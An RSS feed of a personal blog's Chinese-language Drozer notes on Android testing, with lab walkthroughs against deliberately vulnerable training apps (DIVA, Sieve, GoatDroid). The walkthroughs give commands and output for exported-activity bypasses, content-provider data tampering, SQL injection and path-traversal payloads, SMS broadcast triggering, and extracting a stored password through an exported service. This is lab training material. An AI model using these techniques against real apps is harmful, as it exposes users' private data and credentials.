<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Drozer :: Tag :: SBK Hugo Site</title><link>https://bernie6401.github.io/tags/drozer/index.html</link><description/><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/drozer/index.xml" rel="self" type="application/rss+xml"/><item><title>Drozer Cheat Sheet</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/drozer-cheat-sheet/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/drozer-cheat-sheet/index.html</guid><description>Drozer Cheat Sheet Basic Console 基本上最常用的command就是
dz> run &lt;drozer module> &lt;optional object> # 啟動內建的module做到依稀操作 dz> help &lt;drozer module> # 查看該module的說明以及參數設定 dz> run app.package.list #列出所有已安裝的app package dz> run app.package.list -f &lt;key word> #列出特定的app package dz> run app.package.info -a &lt;app package name> # 列出該app的基本訊息 dz> run app.package.manifest &lt;app package name e.g. jakhar.aseem.diva> # 查看AndroidManifest.xml的資訊 dz> run app.package.attacksurface &lt;app package name e.g. com.mwr.example.sieve> # 查看該app有什麼攻擊面 Attack Surface: 3 activities exported # 也許可以啟動一個activity並且bypass某種應該阻止我啟動他的權限 0 broadcast receivers exported 2 content providers exported # 也許可以fetch private data或是利用某些漏洞 e.g. sqli or path traversal 2 services exported is debuggable 接著根據得到的資訊看要用以下哪一種的攻擊模式</description></item><item><title>Drozer/MobSF Installation</title><link>https://bernie6401.github.io/tools/others/android-related/installation/drozer_mobsf-installation/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/installation/drozer_mobsf-installation/index.html</guid><description>Drozer/MobSF Installation Installation - Drozer 我是參考1的說明，但其實參考官網的也可以，我是用docker裝
Download drozer-agent &amp; Install - Download 這是要安裝在手機測試端的類似一個server的概念，而我們的電腦端也要安裝類似的東西(有好幾種方式，我是用Docker)，讓電腦和手機可以互通 $ adb install drozer-agent.apk Start a Session 打開agent app會發現右下角有一個Off，點擊後會變成On，代表這個agent已經準備好要和電腦這邊的server連接 ![Screenshot_20240603-131808](https://hackmd.io/_uploads/SkPEfC9NC.png =200x) 設定電腦的Port轉發到Android的某個Port 根據2的說明，以及官網的要求，我們必須要把電腦31415這個port的封包轉發到手機端的31415這個port Android 的 adb forward 通訊埠轉發的功能，adb forward 的功能是轉發 PC 電腦上某個埠號 (port) 資料到 Android 裝置的某個埠號 (port)，例如：下列 adb forward 指令就是將 PC 端的 port 10000 收到的資料，轉發給到 Android Device 的 port 20000
$ adb forward tcp:31415 tcp:31415 Install PC Drozer Client 看到以下畫面就代表成功了 $ docker run -it --add-host host.docker.internal:host-gateway withsecurelabs/drozer console connect --server host.docker.internal Selecting ff762fc058e91df3 (Google Pixel 6a 13) .. ..:. ..o.. .r.. ..a.. . ....... . ..nd ro..idsnemesisand..pr .otectorandroidsneme. .,sisandprotectorandroids+. ..nemesisandprotectorandroidsn:. .emesisandprotectorandroidsnemes.. ..isandp,..,rotecyayandro,..,idsnem. .isisandp..rotectorandroid..snemisis. ,andprotectorandroidsnemisisandprotec. .torandroidsnemesisandprotectorandroid. .snemisisandprotectorandroidsnemesisan: .dprotectorandroidsnemesisandprotector. drozer Console (v3.0.2) dz> Installation - MobSF 可以直接使用線上的工具，也可以用docker架在自己的電腦</description></item><item><title>Test DIVA - activity exported</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-diva/test-diva---activity-exported/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-diva/test-diva---activity-exported/index.html</guid><description>DIVA - Download Test DIVA - activity exported 參考1234
起手式 - 確認App資訊
dz> run app.package.list -f diva Attempting to run shell module jakhar.aseem.diva (Diva) dz> run app.package.info -a jakhar.aseem.diva Attempting to run shell module Package: jakhar.aseem.diva Application Label: Diva Process Name: jakhar.aseem.diva Version: 1.0 Data Directory: /data/user/0/jakhar.aseem.diva APK Path: /data/app/~~ieYmYeSxvDRbS7R8da3n_g==/jakhar.aseem.diva--xnWMS5i2UVEuuoE1JHskg==/base.apk UID: 10282 GID: [3003] Shared Libraries: [/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar] Shared User ID: null Uses Permissions: - android.permission.WRITE_EXTERNAL_STORAGE - android.permission.READ_EXTERNAL_STORAGE - android.permission.INTERNET - android.permission.POST_NOTIFICATIONS - android.permission.ACCESS_MEDIA_LOCATION - android.permission.READ_MEDIA_AUDIO - android.permission.READ_MEDIA_VIDEO - android.permission.READ_MEDIA_IMAGES Defines Permissions: - None dz> run app.package.attacksurface jakhar.aseem.diva Attempting to run shell module Attack Surface: 3 activities exported 0 broadcast receivers exported 1 content providers exported 0 services exported is debuggable package name: jakhar.aseem.diva attack surface: activities exported/content providers exported/is debuggable</description></item><item><title>Test DIVA - content provider exported - DB Based</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/index.html</guid><description>Test DIVA - content provider exported - DB Based 這一題是第11. Access Control Issues - Part 3，用意是要我們不需要PIN code就可以access儲存起來的notes
起手式 dz> run app.provider.info -a jakhar.aseem.diva Attempting to run shell module Package: jakhar.aseem.diva Authority: jakhar.aseem.diva.provider.notesprovider Read Permission: null Write Permission: null Content Provider: jakhar.aseem.diva.NotesProvider Multiprocess Allowed: False Grant Uri Permissions: False Uri Permission Patterns: Path Permissions: dz> run scanner.provider.finduris -a jakhar.aseem.diva Attempting to run shell module Scanning jakhar.aseem.diva... No respone from content URI: content://jakhar.aseem.diva.provider.notesprovider/ Got a response from content Uri: content://jakhar.aseem.diva.provider.notesprovider/notes No respone from content URI: content://jakhar.aseem.diva.provider.notesprovider Got a response from content Uri: content://jakhar.aseem.diva.provider.notesprovider/notes/ For sure accessible content URIs: content://jakhar.aseem.diva.provider.notesprovider/notes content://jakhar.aseem.diva.provider.notesprovider/notes/ 從以上測試結果可以知道jakhar.aseem.diva.NotesProvider的狀況，以及對應的URI為何 逆向 從NotesProvider這個class可以知道他就是一個負責管理Notes資料庫的一個class，並且同時負責query/update/insert/delete這幾個function，那我們是不是也可以用和Sieve類似的方法對這個database發出request query/insert/update/delete/sqli query 我們達到了一開始題目的要求，只需要直接query就好了 dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --vertical Attempting to run shell module _id 5 title Exercise note Alternate days running _id 4 title Expense note Spent too much on home theater _id 6 title Weekend note b333333333333r _id 3 title holiday note Either Goa or Amsterdam _id 2 title home note Buy toys for baby, Order dinner _id 1 title office note 10 Meetings. 5 Calls. Lunch with CEO insert dz> run app.provider.insert content://jakhar.aseem.diva.provider.notesprovider/notes --integer _id 7 --string title pwn1 --string note pwnpwn1 Attempting to run shell module Done. dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes Attempting to run shell module | _id | title | note | | 5 | Exercise | Alternate days running | | 4 | Expense | Spent too much on home theater | | 6 | Weekend | b333333333333r | | 3 | holiday | Either Goa or Amsterdam | | 2 | home | Buy toys for baby, Order dinner | | 1 | office | 10 Meetings. 5 Calls. Lunch with CEO | | 7 | pwn1 | pwnpwn1 | update dz> run app.provider.update content://jakhar.aseem.diva.provider.notesprovider/notes --selection "_id=?" --selectio n-args 7 --string title pwn2 --string note pwnpwn2 Attempting to run shell module Done. dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes Attempting to run shell module | _id | title | note | | 5 | Exercise | Alternate days running | | 4 | Expense | Spent too much on home theater | | 6 | Weekend | b333333333333r | | 3 | holiday | Either Goa or Amsterdam | | 2 | home | Buy toys for baby, Order dinner | | 1 | office | 10 Meetings. 5 Calls. Lunch with CEO | | 7 | pwn2 | pwnpwn2 | delete dz> run app.provider.delete content://jakhar.aseem.diva.provider.notesprovider/notes --selection "_id=?" --selection -args 7 Attempting to run shell module Done. dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes Attempting to run shell module | _id | title | note | | 5 | Exercise | Alternate days running | | 4 | Expense | Spent too much on home theater | | 6 | Weekend | b333333333333r | | 3 | holiday | Either Goa or Amsterdam | | 2 | home | Buy toys for baby, Order dinner | | 1 | office | 10 Meetings. 5 Calls. Lunch with CEO | sqli 測試的payload如下，的確出現sqli的漏洞，而且可以看到完整的table dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --selection "'" Attempting to run shell module Exception occured: unrecognized token: "') ORDER BY title" (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM notes WHERE (') ORDER BY title dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection "* FROM SQLITE_MASTER WHERE type='table';--" Attempting to run shell module | type | name | tbl_name | rootpage | sql | | table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) | | table | notes | notes | 4 | CREATE TABLE notes (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, note TEXT NOT NULL) | | table | sqlite_sequence | sqlite_sequence | 5 | CREATE TABLE sqlite_sequence(name,seq) | 也可以透過drozer自動找可能的點 dz> run scanner.provider.injection -a jakhar.aseem.diva Attempting to run shell module Scanning jakhar.aseem.diva... Not Vulnerable: content://jakhar.aseem.diva.provider.notesprovider/ content://jakhar.aseem.diva.provider.notesprovider Injection in Projection: content://jakhar.aseem.diva.provider.notesprovider/notes/ content://jakhar.aseem.diva.provider.notesprovider/notes Injection in Selection: content://jakhar.aseem.diva.provider.notesprovider/notes/ content://jakhar.aseem.diva.provider.notesprovider/notes dz> run scanner.provider.sqltables -a jakhar.aseem.diva Attempting to run shell module Scanning jakhar.aseem.diva... Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/: android_metadata notes sqlite_sequence Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes: android_metadata notes sqlite_sequence</description></item><item><title>Test Sieve - activities exported</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---activities-exported/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---activities-exported/index.html</guid><description>Drozer Seive - 官網, Download Sieve is a small password manager app created to showcase some of the common vulnerabilities found in Android applications.
Test Sieve - activities exported 參考12，在測試之前要先點進去Sieve App中設定password和email之類的基本資訊，這樣之後測試才知道哪邊其實是漏洞
起手式-確認基本資訊 dz> run app.package.list -f Sieve # 確認該App的package name Attempting to run shell module com.mwr.example.sieve (Sieve) dz> run app.package.info -a com.mwr.example.sieve # 確認該App的基本資訊 Attempting to run shell module Package: com.mwr.example.sieve Application Label: Sieve Process Name: com.mwr.example.sieve Version: 1.0 Data Directory: /data/user/0/com.mwr.example.sieve APK Path: /data/app/~~_mRnxjv10ez6OXDQWBrRZw==/com.mwr.example.sieve-yL301IHv87w7debjGy21vA==/base.apk UID: 10285 GID: [3003] Shared Libraries: [/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar] Shared User ID: null Uses Permissions: - android.permission.READ_EXTERNAL_STORAGE - android.permission.WRITE_EXTERNAL_STORAGE - android.permission.INTERNET - android.permission.POST_NOTIFICATIONS - android.permission.ACCESS_MEDIA_LOCATION - android.permission.READ_MEDIA_AUDIO - android.permission.READ_MEDIA_VIDEO - android.permission.READ_MEDIA_IMAGES Defines Permissions: - com.mwr.example.sieve.READ_KEYS - com.mwr.example.sieve.WRITE_KEYS dz> run app.package.manifest com.mwr.example.sieve # 確認該App的manifest有沒有什麼異常或漏洞的提示 ... dz> run app.package.attacksurface com.mwr.example.sieve # 確認該App的攻擊面有哪些 Attempting to run shell module Attack Surface: 3 activities exported 0 broadcast receivers exported 2 content providers exported 2 services exported is debuggable 看攻擊面的左邊就是該攻擊點有幾個 activities exported 列出exported activities有哪些 dz> run app.activity.info -a com.mwr.example.sieve Attempting to run shell module Package: com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity Permission: null com.mwr.example.sieve.MainLoginActivity Permission: null com.mwr.example.sieve.PWList Permission: null 啟動activity dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList 此時會看到手機啟動Sieve App，並且原本應該是需要password才能access的activity，居然可以直接bypass ![Screenshot_20240603-163856](https://hackmd.io/_uploads/rkrr-ZsNA.png =200x) Reference drozer之玩轉sieve ↩︎</description></item><item><title>Test Sieve - broadcast receivers exported</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---broadcast-receivers-exported/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---broadcast-receivers-exported/index.html</guid><description>Test Sieve - broadcast receivers exported 這個就不是用Sieve做示範，因為這個App沒有match的receiver
dz> run app.broadcast.info -a com.mwr.example.sieve Attempting to run shell module Package: com.mwr.example.sieve No matching receivers. 所以我就用之前安裝的goatdroid做示範
檢查broadcast receiver dz> run app.broadcast.info -a org.owasp.goatdroid.fourgoats Attempting to run shell module Package: org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver Permission: null 確認後就逆向看一下 在org.owasp.goatdroid.fourgoats.broadcastreceivers中有SendSMSNowReceiver這個class，內容如下: public class SendSMSNowReceiver extends BroadcastReceiver { Context context; @Override // android.content.BroadcastReceiver public void onReceive(Context arg0, Intent arg1) { this.context = arg0; SmsManager sms = SmsManager.getDefault(); Bundle bundle = arg1.getExtras(); sms.sendTextMessage(bundle.getString("phoneNumber"), null, bundle.getString("message"), null, null); Utils.makeToast(this.context, Constants.TEXT_MESSAGE_SENT, 1); } } Send Something 此時我們就可以用drozer發出一個intent，但是在發出之前要看一下AndroidManifest.xml中對於receiver的描述如下，如果想知道這個intent-filter代表的事情可以參考[^chatgpt-intent-filter]，簡單來說就是所有app都可以發出broadcast，那什麼樣的intent會被goatdroid所接收呢?就是帶有org.owasp.goatdroid.fourgoats.SOCIAL_SMS這個action才會被接收，並且觸發onReceive這個function &lt;manifest versionCode="1" versionName="1.0" package="org.owasp.goatdroid.fourgoats"> ... &lt;application theme="@2131361870" label="@2131296266" icon="@2130837632" debuggable="true"> ... &lt;receiver label="Send SMS" name=".broadcastreceivers.SendSMSNowReceiver"> &lt;intent-filter> &lt;action name="org.owasp.goatdroid.fourgoats.SOCIAL_SMS">&lt;/action> &lt;/intent-filter> &lt;/receiver> &lt;/application> ... &lt;/manifest> dz> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message "Hello mate!" 因為fourgoat這個App需要一個server，但是原作把server的link下架了，所以我也不知道實際送出這個broadcast會有什麼效果，但就是先紀錄起來，之後有機會可以用</description></item><item><title>Test Sieve - content providers exported - DB Based</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/index.html</guid><description>Test Sieve - content providers exported - DB Based 如果想知道實際的狀況和content URI是什麼，可以參考ChatGPT的說明
起手式 從以下command的結果可以知道com.mwr.example.sieve.DBContentProvider和com.mwr.example.sieve.FileBackupProvider的狀況，並且從結果可以知道URI的形式長怎樣 content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ content://com.mwr.example.sieve.DBContentProvider/Passwords :::spoiler dz> run app.provider.info -a com.mwr.example.sieve Attempting to run shell module Package: com.mwr.example.sieve Authority: com.mwr.example.sieve.DBContentProvider Read Permission: null Write Permission: null Content Provider: com.mwr.example.sieve.DBContentProvider Multiprocess Allowed: True Grant Uri Permissions: False Uri Permission Patterns: Path Permissions: Path: /Keys Type: PATTERN_LITERAL Read Permission: com.mwr.example.sieve.READ_KEYS Write Permission: com.mwr.example.sieve.WRITE_KEYS Authority: com.mwr.example.sieve.FileBackupProvider Read Permission: null Write Permission: null Content Provider: com.mwr.example.sieve.FileBackupProvider Multiprocess Allowed: True Grant Uri Permissions: False Uri Permission Patterns: Path Permissions: dz> run scanner.provider.finduris -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... No respone from content URI: content://com.mwr.example.sieve.DBContentProvider/Keys No respone from content URI: content://com.mwr.example.sieve.DBContentProvider/ No respone from content URI: content://com.mwr.example.sieve.DBContentProvider No respone from content URI: content://com.mwr.example.sieve.FileBackupProvider No respone from content URI: content://com.mwr.example.sieve.FileBackupProvider/ Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Keys/ Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Passwords/ Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Passwords For sure accessible content URIs: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ content://com.mwr.example.sieve.DBContentProvider/Passwords ::: 逆向 實際去看DBContentProvider這個class，會發現他把所有的query/update/delete/insert function都寫好了，不過我們可以先看初始化的時候onCreate在做的事情 @Override // android.content.ContentProvider public boolean onCreate() { this.pwdb = new PWDBHelper(getContext()); this.sUriMatcher.addURI("com.mwr.example.sieve.DBContentProvider", PWTable.TABLE_NAME, 100); this.sUriMatcher.addURI("com.mwr.example.sieve.DBContentProvider", "Keys", KEY); return false; } 再跟進去PWDBHelper，他主要就是管理 Android SQLite 資料庫的class，並進行初始化的動作，接著後續創了兩個table，包含==Passwords==和==Keys==(其實我覺得這個URI應該就類似database的table) query/insert/update/delete/sqli query #Simple Query dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b'Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=' (Base64-encoded) email bernie6401@gmail.com insert 根據上面的描述以及逆向的結果，我可以知道各個欄位的data type，insert的時候就是都加進去就可了 dz> run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords/ --integer _id 2 --string password bbb --string email aaa@bbb.com Attempting to run shell module Done. dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b'Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=' (Base64-encoded) email bernie6401@gmail.com _id 2 service null username null password bbb email aaa@bbb.com update _id=2的data，被我們改掉了 dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "_id=?" --selection-args 2 --string password ccc --string email ddd@eee.com Attempting to run shell module Done. dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b'Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=' (Base64-encoded) email bernie6401@gmail.com _id 2 service null username null password ccc email ddd@eee.com delete 只剩下最一開始我們設定的data dz> run app.provider.delete content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "_id=?" --selection-args 2 Attempting to run shell module Done. dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b'Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=' (Base64-encoded) email bernie6401@gmail.com sqli 如下結果所示，的確存在sqli，並且可以得到完整的table # 先嘗試丟一些trash byte dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'" Attempting to run shell module Exception occured: unrecognized token: "')" (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM Passwords WHERE (') dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection "* FROM SQLITE_MASTER WHERE type='table';--" Attempting to run shell module | type | name | tbl_name | rootpage | sql | | table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) | | table | Passwords | Passwords | 4 | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) | | table | Key | Key | 5 | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT ) 我們也可以用drozer自動幫我們找 dz> run scanner.provider.injection -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... Not Vulnerable: content://com.mwr.example.sieve.DBContentProvider content://com.mwr.example.sieve.FileBackupProvider content://com.mwr.example.sieve.DBContentProvider/Keys content://com.mwr.example.sieve.DBContentProvider/ content://com.mwr.example.sieve.FileBackupProvider/ Injection in Projection: content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ Injection in Selection: content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ dz> run scanner.provider.sqltables -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Passwords: android_metadata Passwords Key Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Keys/: android_metadata Passwords Key Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Passwords/: android_metadata Passwords Key</description></item><item><title>Test Sieve - content providers exported - File SystemBased</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---file-systembased/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---file-systembased/index.html</guid><description>Test Sieve - content providers exported - File SystemBased 有關於基於File System的Content Provider - 逆向 在com.mwr.example.sieve.FileBackupProvider中可以特別注意onCreate以及ParcelFileDescriptor這個funnction public class FileBackupProvider extends ContentProvider { ... @Override // android.content.ContentProvider public boolean onCreate() { this.sUriMatcher.addURI("com.mwr.example.sieve.FileBackupProvider", "*", DATABASE); return false; } @Override // android.content.ContentProvider public ParcelFileDescriptor openFile(Uri uri, String mode) { int modeCode; if (mode.equals("r")) { modeCode = 268435456; } else if (mode.equals("rw")) { modeCode = 805306368; } else if (mode.equals("rwt")) { modeCode = 805306368; } else { Log.w(TAG, "Unrecognised code to open file: " + mode); return null; } try { return ParcelFileDescriptor.open(new File(uri.getPath()), modeCode); } catch (FileNotFoundException e) { Log.e(TAG, "ERROR: unable to open file: " + e.getMessage()); return null; } } 實際讀取文件或是Path Traversal 為了測試他真的能夠讀取到特定文件，我在手機的Download創了一個secret.txt，不管是哪一個file，都可以正常讀取 $ echo "this is secret file" > /storage/emulated/0/Download/secret.txt dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/storage/emulated/0/Download/secret.txt Attempting to run shell module this is secret file dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts Attempting to run shell module 127.0.0.1 localhost ::1 ip6-localhost 也可以利用drozer自動找尋path traversal的漏洞在哪裡 dz> run scanner.provider.traversal -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... Not Vulnerable: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Passwords/ content://com.mwr.example.sieve.DBContentProvider/ content://com.mwr.example.sieve.DBContentProvider/Keys content://com.mwr.example.sieve.DBContentProvider Vulnerable Providers: content://com.mwr.example.sieve.FileBackupProvider content://com.mwr.example.sieve.FileBackupProvider/</description></item><item><title>Test Sieve - is debuggable</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---is-debuggable/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---is-debuggable/index.html</guid><description>Test Sieve - is debuggable dz> run app.package.debuggable Attempting to run shell module Package: org.owasp.goatdroid.fourgoats UID: 10286 Permissions: - None. Package: com.mwr.example.sieve UID: 10285 Permissions: - None. Package: com.withsecure.dz UID: 10284 Permissions: - None. Package: jakhar.aseem.diva UID: 10282 Permissions: - None.</description></item><item><title>Test Sieve - services exported</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---services-exported/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---services-exported/index.html</guid><description>Test Sieve - services exported 列出exported services有哪些 dz> run app.service.info -a com.mwr.example.sieve Attempting to run shell module Package: com.mwr.example.sieve com.mwr.example.sieve.AuthService Permission: null com.mwr.example.sieve.CryptoService Permission: null 逆向 從以上可以知道有兩個service是被export的，這樣的話就可以逆一下判斷可以送出什麼東西以及可能的漏洞在哪，按照教學的說明我直接看==AuthService==這個service， 在com.mwr.example.sieve.AuthService中的其中一段就是有問題的地方: public class AuthService extends Service { ... private final class MessageHandler extends Handler { ... public void handleMessage(Message msg) { ... switch (msg.what) { case 4: ... case AuthService.MSG_CHECK /* 2354 */: if (msg.arg1 == AuthService.TYPE_KEY) { responseCode3 = 42; String recievedString = returnBundle.getString("com.mwr.example.sieve.PASSWORD"); if (AuthService.this.verifyKey(recievedString)) { AuthService.this.showNotification(); returnVal2 = 0; } else { returnVal2 = 1; } } else if (msg.arg1 == AuthService.TYPE_PIN) { responseCode3 = 41; String recievedString2 = returnBundle.getString("com.mwr.example.sieve.PIN"); if (AuthService.this.verifyPin(recievedString2)) { returnBundle = new Bundle(); returnBundle.putString("com.mwr.example.sieve.PASSWORD", AuthService.this.getKey()); returnVal2 = 0; } else { returnVal2 = 1; } } else { sendUnrecognisedMessage(); return; } sendResponseMessage(5, responseCode3, returnVal2, returnBundle); return; ... 首先在msg.what=2354且msg.arg1=AuthService.TYPE_PIN的地方，若程式讀取到的com.mwr.example.sieve.PIN的value(也就是PIN Code)，經過verifyPin這個function比對過後一致，則他會return一個bundle，內涵com.mwr.example.sieve.PASSWORD以及我們之前設定的password，並且回傳response message給我們 →[5, 41, 0, {com.mwr.example.sieve.PASSWORD:&lt;password>}] 而這個問題在哪裡呢?經過前期的確認以及逆向，我們可以寫個script爆破，不斷送出一些pin code給這個service，則因為大多時候PIN Code的複雜度比較低，所以總有一天可以得到使用者的密碼了 和service互動 從下面的結果來看，一開始設定的密碼為==123456acitseccom== dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve.PIN &lt;User PIN> --bundle-as-obj Attempting to run shell module Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService: what: 5 arg1: 41 arg2: 0 Extras com.mwr.example.sieve.PASSWORD (String) : 123456acitseccom</description></item></channel></rss>